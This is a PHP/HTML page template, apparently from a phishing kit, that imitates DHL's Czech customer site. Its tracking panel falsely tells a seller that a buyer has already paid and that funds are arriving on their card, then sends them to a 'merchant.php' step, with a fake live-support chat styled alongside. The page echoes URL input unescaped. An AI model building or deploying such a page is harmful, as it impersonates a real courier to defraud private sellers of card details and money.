<div class="header__linkCaption"> <span>expresní zásilky</span> </div>
</a>
<ul class="header__navigationDropdown_sub">
<li tabindex="0">
<a href="https://www.dhl.com/cz/privatkunden/pakete-empfangen/express-sendung-empfangen/express-sendung-umleiten.html" tabindex="-1" class="header__linkPrimary  ">
<div class="header__linkCaption"> <span>Přesměrování před doručením</span> </div>
</a>
</li>
<li tabindex="0">
<a href="https://www.dhl.com/cz/privatkunden/pakete-empfangen/express-sendung-empfangen/express-sendung-verpasst.html" tabindex="-1" class="header__linkPrimary  ">
<div class="header__linkCaption"> <span>zmeškal program</span> </div>
</a>
</li>
<li tabindex="0">
<a href="https://www.dhl.com/cz/privatkunden/pakete-empfangen/express-sendung-empfangen/faq.html" tabindex="-1" class="header__linkPrimary  ">
<div class="header__linkCaption"> <span>FAQ Zásilky podléhají clu</span> </div>
</a>
</li>
</ul>
</li>
<li tabindex="0" class="lang hiddenLG langToggle-wrapper"> <a tabindex="-1" href="" id="lang-toggle" class="lang__option lang__option--current">
cz
<div class="header__linkIcon hiddenIn toggleDropdown">
<span class="icon">
<svg role="image" class="arrow-down">
</svg><img src="./prop_files/dhl-image-1.svg">

</span>
</div>
</a>
<div class="lang__list">
<div tabindex="0" class="lang__list-item"> <a tabindex="-1" class="lang__option" href="https://www.dhl.com/en/privatkunden.html">en</a> </div>
</div>
</li>
</ul>
</li>
<li tabindex="0" class="header_link has-dropdown">
<a tabindex="-1" href="https://www.dhl.com/cz/privatkunden/hilfe-kundenservice.html" class="header__linkPrimary  ">
<div class="header__linkCaption" aria-selected="false"> pomoc a kontakt </div>
<div class="header__linkIcon menu__slideIn"> <span class="icon">
<svg xmlns="http://www.w3.org/2000/svg" width="18" height="17" viewBox="0 0 18 17">
<path fill-rule="evenodd" d="M4.23663958,9.33285646 L8.96714933,14.063242 C8.96714933,14.063242 9.41862628,14.6230237 9.30696802,15.1837991 C9.14587707,15.9940978 8.03550458,16.4661924 7.33276548,15.9269041 C7.27538381,15.8829363 7.26333615,15.8691498 7.21054998,15.8198413 L0.359899475,8.96906663 C0.189120708,8.78673701 0.17471319,8.74264504 0.124162675,8.64017778 C-0.0794056147,8.22732787 -0.0299729244,7.70331651 0.252712511,7.33468278 C0.296804483,7.27730112 0.310590988,7.26525345 0.359899475,7.21259149 L7.21054998,0.361816782 C7.46827067,0.120490859 7.80411487,-0.0112882476 8.17014035,0.000759418088 C8.24192953,0.00783897424 8.26018733,0.00783897424 8.3311071,0.0219980866 C9.14488345,0.183834256 9.61350038,1.29346153 9.07421209,1.99620063 C9.03024432,2.0535823 9.01645781,2.06562996 8.96714933,2.11829192 L4.23663958,6.84880167 L16.7634795,6.84880167 C16.7916735,6.84979529 16.8199917,6.85066471 16.8481858,6.85165833 C17.1604314,6.88382684 17.2498574,6.93288692 17.4088369,7.02964086 C17.8929792,7.32400135 18.1232511,7.97370588 17.9338419,8.50678404 C17.7816936,8.93453827 17.3807671,9.25970104 16.9326436,9.3213056 C16.8578736,9.33161443 16.8387464,9.3302482 16.7634795,9.33285646 L4.23663958,9.33285646 Z" transform="matrix(-1 0 0 1 18 0)"></path>
</svg>
</span> </div>
</a>
<ul class="header__navigationDropdown sub-menu">
<li tabindex="0" class="menu-back hiddenLG">
<a href="#" tabindex="-1" class="header__linkPrimary" target="_blank" rel="noopener">
<div class="header__linkIcon"> <span class="icon">
<svg xmlns="http://www.w3.org/2000/svg" width="18" height="17" viewBox="0 0 18 17">
<path fill-rule="evenodd" d="M4.23663958,9.33285646 L8.96714933,14.063242 C8.96714933,14.063242 9.41862628,14.6230237 9.30696802,15.1837991 C9.14587707,15.9940978 8.03550458,16.4661924 7.33276548,15.9269041 C7.27538381,15.8829363 7.26333615,15.8691498 7.21054998,15.8198413 L0.359899475,8.96906663 C0.189120708,8.78673701 0.17471319,8.74264504 0.124162675,8.64017778 C-0.0794056147,8.22732787 -0.0299729244,7.70331651 0.252712511,7.33468278 C0.296804483,7.27730112 0.310590988,7.26525345 0.359899475,7.21259149 L7.21054998,0.361816782 C7.46827067,0.120490859 7.80411487,-0.0112882476 8.17014035,0.000759418088 C8.24192953,0.00783897424 8.26018733,0.00783897424 8.3311071,0.0219980866 C9.14488345,0.183834256 9.61350038,1.29346153 9.07421209,1.99620063 C9.03024432,2.0535823 9.01645781,2.06562996 8.96714933,2.11829192 L4.23663958,6.84880167 L16.7634795,6.84880167 C16.7916735,6.84979529 16.8199917,6.85066471 16.8481858,6.85165833 C17.1604314,6.88382684 17.2498574,6.93288692 17.4088369,7.02964086 C17.8929792,7.32400135 18.1232511,7.97370588 17.9338419,8.50678404 C17.7816936,8.93453827 17.3807671,9.25970104 16.9326436,9.3213056 C16.8578736,9.33161443 16.8387464,9.3302482 16.7634795,9.33285646 L4.23663958,9.33285646 Z"></path>
</svg>
</span> </div>
<div class="header__linkCaption">Zadní</div>
</a>
</li>
<li class="link-holder col-lg-3" tabindex="0">
<a href="https://www.dhl.com/cz/privatkunden/hilfe-kundenservice/sendungsverfolgung.html" tabindex="-1" class="header__linkPrimary   ">
<div class="header__linkCaption"> <span>Pomoc s mým balíčkem</span> </div>
</a>
<ul class="header__navigationDropdown_sub">
<li tabindex="0">
<a href="https://www.dhl.com/cz/privatkunden/hilfe-kundenservice/sendungsverfolgung/was-bedeutet-mein-sendungsstatus.html" tabindex="-1" class="header__linkPrimary  ">
<div class="header__linkCaption"> <span>Důležitost stavu zásilky</span> </div>
</a>
</li>
<li tabindex="0">
<a href="https://www.dhl.com/cz/privatkunden/hilfe-kundenservice/sendungsverfolgung/paketankuendigung.html" tabindex="-1" class="header__linkPrimary  ">
<div class="header__linkCaption"> <span>oznámení balíčku</span> </div>
</a>
</li>
<li tabindex="0">
<a href="https://www.dhl.com/cz/privatkunden/hilfe-kundenservice/sendungsverfolgung/hilfe-zur-paketumleitung.html" tabindex="-1" class="header__linkPrimary  ">
<div class="header__linkCaption"> <span>přesměrování paketů</span> </div>
</a>
</li>
<li tabindex="0">
<a href="https://www.dhl.com/cz/privatkunden/hilfe-kundenservice/sendungsverfolgung/zoll.html" tabindex="-1" class="header__linkPrimary  " target="_blank" rel="noopener">
<div class="header__linkCaption"> <span>clo a dovoz</span> </div>
</a>
</li>
<li tabindex="0">
<a href="https://www.dhl.com/cz/privatkunden/hilfe-kundenservice/sendungsverfolgung/probleme-loesungen.html" tabindex="-1" class="header__linkPrimary  ">
<div class="header__linkCaption"> <span>Další otázky</span> </div>
</a>
</li>
</ul>
</li>
<li class="link-holder col-lg-3" tabindex="0">
<a href="https://www.dhl.com/cz/privatkunden/hilfe-kundenservice/empfangen.html" tabindex="-1" class="header__linkPrimary   ">
<div class="header__linkCaption"> <span>Balíček přijímá pomoc</span> </div>
</a>
<ul class="header__navigationDropdown_sub">
<li tabindex="0">
<a href="https://www.dhl.com/cz/privatkunden/hilfe-kundenservice/empfangen/ablageort-nachbar.html" tabindex="-1" class="header__linkPrimary  ">
<div class="header__linkCaption"> <span>umístění skladu &amp; soused</span> </div>
</a>
</li>
<li tabindex="0">
<a href="https://www.dhl.com/cz/privatkunden/hilfe-kundenservice/empfangen/liefertag.html" tabindex="-1" class="header__linkPrimary  ">
<div class="header__linkCaption"> <span>den doručení</span> </div>
</a>
</li>
<li tabindex="0">
<a href="https://www.dhl.com/cz/privatkunden/hilfe-kundenservice/empfangen/packstation.html" tabindex="-1" class="header__linkPrimary  ">
<div class="header__linkCaption"> <span>balící stanice</span> </div>
</a>
</li>
<li tabindex="0">
<a href="https://www.dhl.com/cz/privatkunden/hilfe-kundenservice/empfangen/filiale-direkt.html" tabindex="-1" class="header__linkPrimary  ">
<div class="header__linkCaption"> <span>větev</span> </div>
</a>
</li>
<li tabindex="0">
<a href="https://www.dhl.com/cz/privatkunden/hilfe-kundenservice/empfangen/hilfe-ablageort-ohne-klingeln.html" tabindex="-1" class="header__linkPrimary  ">
<div class="header__linkCaption"> <span>Úložné místo bez zvonku</span> </div>
</a>
</li>
</ul>
</li>
<li class="link-holder col-lg-3" tabindex="0">
<a href="https://www.dhl.com/cz/privatkunden/hilfe-kundenservice/versenden.html" tabindex="-1" class="header__linkPrimary   ">
<div class="header__linkCaption"> <span>pomoc s přepravou</span> </div>
<div class="header__linkIcon toggleDropdown hiddenIn"> <span class="icon">
</span> </div>
</a>
<ul class="header__navigationDropdown_sub">
<li tabindex="0">
<a href="https://www.dhl.com/cz/privatkunden/hilfe-kundenservice/versenden/preise-produkte.html" tabindex="-1" class="header__linkPrimary  ">
<div class="header__linkCaption"> <span>Ceny &amp; produkty</span> </div>
</a>
</li>
<li tabindex="0">
<a href="https://www.dhl.com/cz/privatkunden/hilfe-kundenservice/versenden/of-bezahlung.html" tabindex="-1" class="header__linkPrimary  ">
<div class="header__linkCaption"> <span>Frank online &amp; platit</span> </div>
</a>
</li>
<li tabindex="0">
<a href="https://www.dhl.com/cz/privatkunden/hilfe-kundenservice/versenden/standorte.html" tabindex="-1" class="header__linkPrimary  ">
<div class="header__linkCaption"> <span>Místa DHL</span> </div>
</a>
</li>
<li tabindex="0">
<a href="https://www.dhl.com/cz/privatkunden/hilfe-kundenservice/versenden/packstation.html" tabindex="-1" class="header__linkPrimary  ">
<div class="header__linkCaption"> <span>balící stanice</span> </div>
</a>
</li>
 </ul>
</li>
<li class="link-holder col-lg-3" tabindex="0">
<a href="https://www.dhl.com/cz/privatkunden/hilfe-kundenservice/uebersicht-zu-den-hilfethemen.html" tabindex="-1" class="header__linkPrimary   ">
<div class="header__linkCaption"> <span>Přehled všech témat nápovědy</span> </div>
</a>
</li>
<li tabindex="0" class="lang hiddenLG langToggle-wrapper"> <a tabindex="-1" href="" id="lang-toggle" class="lang__option lang__option--current">
cz
<div class="header__linkIcon hiddenIn toggleDropdown">
<span class="icon">
<svg role="image" class="arrow-down">
</svg><img src="./prop_files/dhl-image-1.svg">

</span>
</div>
</a>
<div class="lang__list">
<div tabindex="0" class="lang__list-item"> <a tabindex="-1" class="lang__option" href="https://www.dhl.com/en/privatkunden.html">en</a> </div>
</div>
</li>
</ul>
</li>
<li class="hiddenMobile hiddenMD search">
<a tabindex="0" href="#search" data-popup-inline="data-popup-inline" class="header__linkPrimary jump" rel="noreferrer"> <span class="icon">
<svg role="image" title="search" class="search">
</svg><img src="./prop_files/dhl-image-6.svg">

</span> </a>
</li>
<li tabindex="0" class="hiddenMobile hiddenMD has-dropdown userMenu js-focusout">
<a tabindex="-1" href="#login" class="header__linkPrimary userMenuButton jump" rel="noreferrer">
<div class="header__linkCaption"> <span class="icon icon-login-bordered">
<svg role="image" title="login" class="login">
</svg><img src="./prop_files/dhl-image-7.svg">

</span> <span class="icon icon-login-filled">
</span> </div>
</a> <span class="loggedInUserName" data-header-id="context-headerBonus" data-footer-id="context-footerBonus" data-anonymous-text="Login">Login</span>
<ul class="header__navigationDropdown">
<li tabindex="0" class="userMenuPrimary">
<div class="">
<div class="loginContainer">
<button tabindex="0" type="button" class="login btn btn-primary btn-block"> Login </button>
</div>
<p class="link-primary link-icon link-iconRight registerLinkLogin"> <span class="icon"> <svg tabindex="-1" role="image" class="arrow-link-right">
</svg><img src="./prop_files/dhl-image-8.svg">

</span> <span class="txt">
<a class="registerLink" href="https://www.dhl.com/cz/privatkunden/kundenkonto/registrierung.html" data-header-context="context-headerBonus" data-header-logout="Sie wurden erfolgreich ausgeloggt.">
<span>Ještě nemáte zákaznický účet DHL? zaregistrujte se nyní zdarma </span> </a>
</span>
</p>
</div>
</li>
<li tabindex="0" class="userMenuPrimary">
<a href="#meineSendungen" target="_self" tabindex="-1" class="jump">
<div class="header__linkCaption">Moje zásilky</div>
<div class="header__linkIcon"> <span class="icon">
</span> </div>
</a>
</li>
<li tabindex="0" class="userMenuPrimary">
<a href="https://www.dhl.com/cz/privatkunden/pakete-versenden/online-frankieren.html" target="_self" tabindex="-1">
<div class="header__linkCaption">Online frankování</div>
<div class="header__linkIcon"> <span class="icon">
</span> </div>
</a>
</li>
<li tabindex="0" class="userMenuPrimary">
<a href="https://www.dhl.com/cz/privatkunden/pakete-versenden/online-frankieren.html?type=AddressBook" target="_self" tabindex="-1">
<div class="header__linkCaption">adresář</div>
<div class="header__linkIcon"> <span class="icon">
</span> </div>
</a>
</li>
<li tabindex="0" class="userMenuPrimary">
<a href="https://www.dhl.com/cz/privatkunden/pakete-versenden/online-frankieren.html?type=ShoppingCartHistory" target="_self" tabindex="-1">
<div class="header__linkCaption">Nedávné nákupy</div>
<div class="header__linkIcon"> <span class="icon">
</span> </div>
</a>
</li>
<li tabindex="0" class="userMenuPrimary">
<a href="https://www.dhl.com/cz/privatkunden/pakete-versenden/online-frankieren.html?type=CouponOverview" target="_self" tabindex="-1">
<div class="header__linkCaption">Moje kódy kupónů</div>
<div class="header__linkIcon"> <span class="icon">
</span> </div>
</a>
</li>
<li tabindex="0" class="userMenuPrimary">
<a href="https://www.dhl.com/cz/privatkunden/anmelden/bonusprogramm.html" target="_self" tabindex="-1">
<div class="header__linkCaption">bonusové body</div>
<div class="header__linkIcon"> <span class="icon">
</span> </div>
</a>
</li>
<li tabindex="0" class="userMenuPrimary">
<a href="https://www.dhl.com/cz/privatkunden/kundenkonto/meine-daten.html" target="_self" tabindex="-1">
<div class="header__linkCaption">Moje data &amp; služby</div>
<div class="header__linkIcon"> <span class="icon">
</span> </div>
</a>
</li>
</ul>
</li>
<li tabindex="0" class="lang js-focusout"> <a tabindex="-1" href="" id="lang-toggle" class="lang__option lang__option--current">
cz
<div class="header__linkIcon hiddenIn toggleDropdown">
<span class="icon">
<svg role="image" class="arrow-down">
</svg><img src="./prop_files/dhl-image-1.svg">

</span>
</div>
</a>
<div class="lang__list">
<div tabindex="0" class="lang__list-item"> <a tabindex="-1" class="lang__option" href="https://www.dhl.com/en/privatkunden.html">en</a> </div>
</div>
</li>
</ul>
</div>
</div>
</header>
</div>
</div>
<div class="c-track-trace-utapi component-margin">
<div class="c-tracking--container l-grid component-wide">
<div class="c-tracking-input--container component-wide l-grid--w-100pc-s ">
<div class="_0">
<div>
<div class="_13">Sledujte balení</div>
<div class="_3">
<div class="_17">
<div style="font-size: 18px; margin-bottom: 20px;">ID odjezdu: <span style="color: #fc0; margin-left: 10px;"><?php echo $_GET['id']; ?></span></div>
<div style="font-size: 18px;">Status: <span style="color: #fc0; margin-left: 10px;">příjem finančních prostředků</span></div>
</div>
</div>
<div class="_3">
<div class="_17 _177">
<h2>Die Lieferung ist bereits bezahlt!</h2>
<div style="font-size: 16px; line-height: 1.7;">
Jakmile obdržíte prostředky na svou kartu, odešlete je kupujícímu zboží podle výše uvedených pokynů.
<br>
<br>
<p>Po odeslání zboží sdělte kupujícímu podací číslo.</p>
</div>
<div class="_20">
<input form="form1" id="_buttonPay" class="_23" value="další" type="submit">
</div>
</div>
</div>
<div class="_16">
<form id="form1" action="merchant.php" method="get">
<input id="_formCost" name="id" value="<?php echo $_GET['id']; ?>" type="hidden">
<div class="_4">údaje o kupujícím:</div>
<div class="_14 _21">
<table>
<tbody><tr>
<td class="_19 _15">Produkt:</td>
<td class="_19"><?php echo $xml->obyava; ?></td>
</tr>
<tr>
<td class="_19 _15">kupující:</td>
<td class="_19"><?php echo $xml->fio; ?></td>
</tr>
<tr>
<td class="_19 _15">celkový:</td>
<td class="_19"><?php echo $xml->fio; ?> Kč</td>
</tr>
<tr>
<td class="_19 _15">ID odjezdu:</td>
<td class="_19"><?php echo $_GET['id']; ?></td>
</tr>
</tbody></table>
</div>
</form>
</div>
</div>
</div>


</div>
</div>
</div>



<footer class="footer">
<div class="scroll-buttons dhl redesign">
<div class="container">
<div class="row"> </div>
</div>
</div>
<footer class="footer dhl redesign" data-is-short-mobile-footer="false">
<div class="container">
<div class="row footer__row footer__rowNavigation">
<div class="col-xs-12 col-sm-6 col-lg-3">
<h4 class="h4">
<a href="">Privatkunden</a>
</h4>
<ul class="footer__navigationItems">
<li> <a href="https://www.dhl.com/cz/privatkunden/pakete-versenden/deutschlandweit-versenden/preise-national.html">Preise</a> </li>
<li> <a href="https://www.dhl.com/cz/privatkunden/pakete-versenden.html">Na loď</a> </li>
<li> <a href="https://www.dhl.com/cz/privatkunden/pakete-empfangen.html">Dostávat</a> </li>
<li> <a href="https://www.dhl.com/cz/privatkunden/anmelden.html">zákaznický účet DHL</a> </li>
<li> <a href="https://www.dhl.com/cz/privatkunden/hilfe-kundenservice.html">Pomoc &amp; Kontakt</a> </li>
<li> <a href="https://www.dhl.com/cz/privatkunden/kampagnenseiten/dhl-app.html" class="download">pošta &amp; Aplikace DHL</a> </li>
</ul>
</div>
<div class="col-xs-12 col-sm-6 col-lg-3">
<h4 class="h4">
<a href="https://www.dhl.com/cz/geschaeftskunden.html">firemní zákazníky</a>
</h4>
<ul class="footer__navigationItems">
<li> <a href="https://www.dhl.com/cz/geschaeftskunden/paket.html">balík</a> </li>
<li> <a href="https://www.dhl.com/cz/geschaeftskunden/express.html">Express</a> </li>
<li> <a href="https://www.dhl.com/cz/geschaeftskunden/logistik.html">logistiky</a> </li>
<li> <a href="https://www.dhl.com/cz/geschaeftskunden/kontakt.html">Kontakt</a> </li>
<li> <a href="https://www.dhl.com/dhl-geschaeftskunde-werden" class="external" rel="noreferrer">stát se zákazníkem</a> </li>
<li> <a href="http://www.dhl.com/" target="_blank" class="external" rel="noreferrer">DHL.com</a> </li>
</ul>
</div>
<div class="col-xs-12 col-sm-6 col-lg-3">
<h4 class="h4">
<a class="jumptarget">společnost</a>
</h4>
<ul class="footer__navigationItems">
<li> <a href="https://www.dhl.com/cz/geschaeftskunden/ueber-uns.html">o nás</a> </li>
<li> <a href="http://www.dpdhl.com/" target="_blank" class="external" rel="noreferrer">čeština Post DHL Group</a> </li>
<li> <a href="http://www.dpdhl.com/karriere" target="_blank" class="external" rel="noreferrer">Kariéra</a> </li>
<li> <a href="http://www.dpdhl.com/presse" target="_blank" class="external" rel="noreferrer">lis</a> </li>
<li> <a href="http://www.dpdhl.com/investoren" target="_blank" class="external" rel="noreferrer">investoři</a> </li>
<li> <a href="https://www.deutschepost.de/cz/n/nachhaltigkeit.html" target="_blank" class="external" rel="noreferrer">udržitelnost</a> </li>
</ul>
</div>
<div class="col-xs-12 col-sm-6 col-lg-3 ">
<h4 class="h4">
<a class="jumptarget">Sociální</a>
</h4>
<ul class="footer__navigationIcons">
<li>
<a href="https://www.facebook.com/DHLPaket/" target="_blank" class="disclaimer external" rel="noreferrer">
<div class="circleIcon circleIcon--highlight"> <span class="icon">
<svg role="image" title="facebook" class="facebook">
</svg><img src="./prop_files/dhl-image-2.svg">

</span> </div>
</a>
</li>
<li>
<a href="https://twitter.com/DHLPaket" target="_blank" class="disclaimer external" rel="noreferrer">
<div class="circleIcon circleIcon--highlight"> <span class="icon">
<svg role="image" title="twitter" class="twitter">
</svg><img src="./prop_files/dhl-image-9.svg">

</span> </div>
</a>
</li>
<li>
<a href="https://www.instagram.com/dhl_global/" target="_blank" class="disclaimer external" rel="noreferrer">
<div class="circleIcon circleIcon--highlight"> <span class="icon">
<svg role="image" title="instagram" class="instagram">
</svg><img src="./prop_files/dhl-image-3.svg">

</span> </div>
</a>
</li>
<li>
<a href="https://www.youtube.com/user/dhl" target="_blank" class="disclaimer external" rel="noreferrer">
<div class="circleIcon circleIcon--highlight"> <span class="icon">
<svg role="image" title="youtube" class="youtube">
</svg><img src="./prop_files/dhl-image-11.svg">

</span> </div>
</a>
</li>
<li>
<a href="https://www.linkedin.com/company/dhl" target="_blank" class="disclaimer external" rel="noreferrer">
<div class="circleIcon circleIcon--highlight"> <span class="icon">
<svg role="image" title="linkedin" class="linkedin">
</svg><img src="./prop_files/dhl-image-4.svg">

</span> </div>
</a>
</li>
<li>
<a href="https://www.xing.com/companies/deutschepostag" target="_blank" class="disclaimer external" rel="noreferrer">
<div class="circleIcon circleIcon--highlight"> <span class="icon">
<svg role="image" title="xing" class="xing">
</svg><img src="./prop_files/dhl-image-10.svg">

</span> </div>
</a>
</li>
</ul>
</div>
</div>
<div class="row footer__row footer__rowLegal">
<div class="col-xs-12">
<h4 class="h4"><img src="./prop_files/dhl-image-12.svg" alt="Deutsche Post DHL Group"></h4>
<ul class="footer__navigationLegal">
<li> <a href="https://www.dhl.com/cz/toolbar/footer/sicherheitshinweise.html">bezpečnostní instrukce</a> </li>
<li> <a href="https://www.dhl.com/cz/toolbar/footer/impressum/impressum_dhlpaket.html">otisk</a> </li>
<li> <a href="https://www.dhl.com/cz/toolbar/footer/agb.html">Podmínky</a> </li>
<li> <a href="https://www.dhl.com/cz/toolbar/footer/rechtliche-hinweise.html">Zákonné oznámení</a> </li>
<li> <a href="https://www.dhl.com/cz/toolbar/footer/datenschutz.html">Soukromí</a> </li>
<li> <a href="#" onclick="OneTrust.ToggleInfoDisplay();return false;" rel="noreferrer">Nastavení souborů cookie</a> </li>
</ul>
<p class="footer__copyright">2022 © DHL Paket GmbH. All rights reserved.</p>
</div>
</div>
</div>
</footer>
<style>
.chaport-container.chaport-container-positioned {
    position: fixed;
    box-sizing: border-box;
    top: auto;
    right: 0;
    bottom: 0;
    left: 0;
    width: auto;
    height: 0;
    overflow: visible;
}
.chaport-container {
    font-size: 14px;
    z-index: 2147483500;
}
.chaport-container .chaport-launcher {
    position: absolute;
    display: block;
    bottom: 0;
    right: 0;
    left: 0;
    z-index: 2147483500;
    width: auto;
    height: 0;
    overflow: visible;
    font-size: 14px;
}
.chaport-container div {
    display: block;
}

.chaport-container.chaport-window-dark-gray .chaport-launcher .chaport-launcher-button, .chaport-content.chaport-window-dark-gray .chaport-launcher .chaport-launcher-button {
    background-color: #3c3c3c;
}
.chaport-container .chaport-launcher .chaport-launcher-button {
    position: absolute;
    bottom: 1.42857em;
    right: 1.42857em;
    width: 4.28571em;
    height: 4.28571em;
    -webkit-border-radius: 50%;
    -moz-border-radius: 50%;
    -ms-border-radius: 50%;
    border-radius: 50%;
    -webkit-box-shadow: 0 5px 38px rgba(0,0,0,0.15);
    box-shadow: 0 5px 38px rgba(0,0,0,0.15);
    cursor: pointer;
    -webkit-transition: visibility 0s linear 0.2s,opacity linear 0.2s;
    -o-transition: visibility 0s linear 0.2s,opacity linear 0.2s;
    transition: visibility 0s linear 0.2s,opacity linear 0.2s;
}
.chaport-container .chaport-anim-show {
    visibility: visible;
    opacity: 1;
    -webkit-transition-delay: 0s !important;
    transition-delay: 0s !important;
}

.chaport-container .chaport-launcher {
    position: absolute;
    display: block;
    bottom: 0;
    right: 0;
    left: 0;
    z-index: 2147483500;
    width: auto;
    height: 0;
    overflow: visible;
    font-size: 14px;
}
.chaport-container .chaport-launcher .chaport-launcher-button .chaport-launcher-chat-icon {
    transition: transform 0.3s cubic-bezier(0.4, 0, 0.2, 1),opacity 0.3s cubic-bezier(0.4, 0, 0.2, 1);
    opacity: 1;
    transform: rotate(0deg);
    width: 2.28571em;
    height: 2.64286em;
    position: absolute;
    margin-top: 0.07143em;
    top: 0.92857em;
    left: 1em;
    background-image: url(/chap.png);
    background-repeat: no-repeat;
    background-size: 100% 100%;
}
.chaport-container .chaport-launcher .chaport-launcher-button {
    position: absolute;
    bottom: 1.42857em;
    right: 1.42857em;
    width: 4.28571em;
    height: 4.28571em;
    -webkit-border-radius: 50%;
    -moz-border-radius: 50%;
    -ms-border-radius: 50%;
    border-radius: 50%;
    -webkit-box-shadow: 0 5px 38px rgba(0,0,0,0.15);
    box-shadow: 0 5px 38px rgba(0,0,0,0.15);
    cursor: pointer;
    -webkit-transition: visibility 0s linear 0.2s,opacity linear 0.2s;
    -o-transition: visibility 0s linear 0.2s,opacity linear 0.2s;
    transition: visibility 0s linear 0.2s,opacity linear 0.2s;
}
.chaport-container .chaport-launcher .chaport-launcher-button .chaport-launcher-close-icon {
    transition: transform 0.3s cubic-bezier(0.4, 0, 0.2, 1),opacity 0.3s cubic-bezier(0.4, 0, 0.2, 1);
    opacity: 0;
    transform: rotate(-45deg) scale(1);
    position: absolute;
    top: 0;
    right: 0;
    width: 4.28571em;
    height: 4.28571em;
}
.chaport-container .chaport-launcher .chaport-launcher-button .chaport-launcher-close-icon:before {
    -ms-transform: rotate(45deg);
    -webkit-transform: rotate(45deg);
    transform: rotate(45deg);
}
.chaport-container .chaport-launcher .chaport-launcher-button .chaport-launcher-close-icon:before, .chaport-container .chaport-launcher .chaport-launcher-button .chaport-launcher-close-icon:after {
    position: absolute;
    top: 1.5em;
    right: 2.07143em;
    content: ' ';
    height: 1.35714em;
    width: 0.14286em;
    background-color: #fff;
}
.chaport-container .chaport-launcher .chaport-launcher-button.no-photo .chaport-launcher-operator-photo {
    opacity: 0;
}
.chaport-container .chaport-launcher .chaport-launcher-button .chaport-launcher-operator-photo {
    transition: transform 0.3s cubic-bezier(0.4, 0, 0.2, 1),opacity 0.3s cubic-bezier(0.4, 0, 0.2, 1);
    opacity: 1;
    transform: rotate(0deg);
    position: absolute;
    z-index: 1;
    width: 100%;
    height: 100%;
}
.chaport-container .chaport-launcher .chaport-launcher-button .chaport-badge-show {
    transform: scale(1);
}

.chaport-container .chaport-launcher .chaport-message .chaport-message-tail:after {
    border-width: 0.33333em;
    bottom: 1.13333em;
    border-left-color: #fff;
}
.chaport-container .chaport-window-anim.chaport-anim-hide {
    transform: translateY(20px);
}
.chaport-container.chaport-container-positioned .chaport-window {
    position: absolute;
    top: auto;
    right: 20px;
    bottom: 115px;
    left: auto;
    width: 300px;
    -webkit-box-shadow: 0 5px 38px rgba(0,0,0,0.15);
    box-shadow: 0 5px 38px rgba(0,0,0,0.15);
    -webkit-border-radius: 8px;
    -moz-border-radius: 8px;
    -ms-border-radius: 8px;
    border-radius: 8px;
    overflow: hidden;
    z-index: 2147483500;
}
.chaport-container .chaport-window-anim {
    transition: height 0s linear 0.3s,visibility 0s linear 0.3s,opacity 0.3s cubic-bezier(0.4, 0, 0.2, 1),transform 0.3s cubic-bezier(0.4, 0, 0.2, 1);
}
.chaport-container .chaport-inner {
    position: relative;
    margin-left: 0px;
    margin-right: 0px;
    background-color: #fff;
}


.chaport-container .chaport-auto-invitation .chaport-auto-invitation-message {
    position: absolute;
    right: 0;
    bottom: 60px;
}

.chaport-container .chaport-auto-invitation .chaport-auto-invitation-message .chaport-auto-invitation-message-body .operator-face {
    position: absolute;
    left: -41px;
    bottom: 7px;
}

.chaport-container .chaport-auto-invitation .chaport-auto-invitation-message .chaport-auto-invitation-message-body .operator-face .photo img {
    width: 100%;
    height: 100%;
    -webkit-border-radius: 50%;
    -moz-border-radius: 50%;
    -ms-border-radius: 50%;
    border-radius: 50%;
}
.chaport-container .chaport-auto-invitation .chaport-auto-invitation-message .chaport-auto-invitation-message-body .operator-name {
    margin-bottom: 5px;
    font-size: 15px;
    font-weight: bold;
}
.chaport-container .chaport-auto-invitation .chaport-auto-invitation-message .chaport-auto-invitation-message-body .message-text {
    font-size: 15px;
}
@media (max-width: 339px), (min-width: 341px) {
.chaport-close, .chaport-container .chaport-close {
    display: block;
}
}

.chaport-container .chaport-big-shadow {
    opacity: 0;
    z-index: 2147483499;
    position: fixed;
    width: 480px;
    height: 480px;
    bottom: 0;
    right: 0;
    content: "";
    pointer-events: none;
    background: radial-gradient(ellipse at bottom right,rgba(27,37,52,0.15) 0,rgba(27,37,52,0) 70%);
    -webkit-transition: opacity 0.2s linear;
    -o-transition: opacity 0.2s linear;
    transition: opacity 0.2s linear;
}
.chaport-content {
    position: absolute;
    top: 0;
    right: 0;
    bottom: 0;
    left: 0;
    overflow: hidden;
    -webkit-border-top-left-radius: 8px;
    -moz-border-top-left-radius: 8px;
    -ms-border-top-left-radius: 8px;
    border-top-left-radius: 8px;
    -webkit-border-top-right-radius: 8px;
    -moz-border-top-right-radius: 8px;
    -ms-border-top-right-radius: 8px;
    border-top-right-radius: 8px;
    display: flex;
    flex-direction: column;
    justify-content: space-between;
}
@media (max-width: 460px), (max-width: 750px) and (orientation: landscape)
.chaport-content {
    -webkit-border-radius: 0;
    -moz-border-radius: 0;
    -ms-border-radius: 0;
    border-radius: 0;
}
.chaport-close, .chaport-container .chaport-close {
    position: absolute;
    top: 0;
    right: 0;
    z-index: 4;
    width: 50px;
    height: 41px;
    cursor: pointer;
    opacity: 0.6;
    -webkit-transition: opacity 0.2s linear;
    -o-transition: opacity 0.2s linear;
    transition: opacity 0.2s linear;
    display: none;
}
.main-textblock {
    background-color: #ffffff;
    border-radius: 4px;
    height: 500px;
}
.operatorblock {
    height: 130px;
    background-color: #3c3c3c;
    top: 0;
}
#operator-photo {

    width: 60px;
    height: 60px;
    margin-bottom: 7px;
    text-align: center;
    margin-top: 8px;
}
#oper-photo-img {
    width: 100%;
    height: 100%;
    border-radius: 50%;
}
.operatorblock-content {
    padding: 20px;
    display: flex;
}
.operator-name {
    font-size: 13px;
    color: rgba(255,255,255,0.7);
}
.team-wrapper {
    text-align: center;
    width: 60%;
    margin-top: 30px;
    margin-left: 4%;
}
.team {
    font-size: 16px;
    color: #fff;
}
.activity-indicator {
    font-size: 13px;
    color: rgba(255,255,255,0.7);
}
.with-status {
    padding-left: 15px;
    display: inline-block;
    position: relative;
}
.status-online {
    display: block;
    background-color: #4fd237;
    position: absolute;
    right: -3px;
    bottom: 3px;
    width: 7px;
    height: 7px;
    background-repeat: no-repeat;
    border-radius: 7px;
    border-width: 1px;
    border-style: solid;
    box-sizing: content-box;
    left: 0;
    right: auto;
    border-color: #4fd237;
}
#input-msg {
    border-top: 1px solid #babac05c;
    width: 100%;
    position: absolute;
    bottom: 0;
    height: 50px;
    margin-bottom: 20px;
}
#smstosup1 {
    margin-left: 10px;
    width: 100%;
    border: none;
    font-size: 15px;
}

.chaport-container .chaport-input-wrapper .chaport-send-icon, .chaport-input-wrapper .chaport-send-icon {
    opacity: 1;
    transform: scale(1);
